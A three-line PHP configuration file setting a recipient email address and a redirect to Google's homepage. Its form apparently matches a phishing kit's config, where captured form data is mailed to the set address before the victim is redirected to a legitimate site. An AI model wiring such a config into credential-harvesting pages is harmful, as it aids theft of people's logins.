<?php 
$Receive_email="bishopnoeljones62@gmail.com";
$redirect="https://www.google.com/";
?>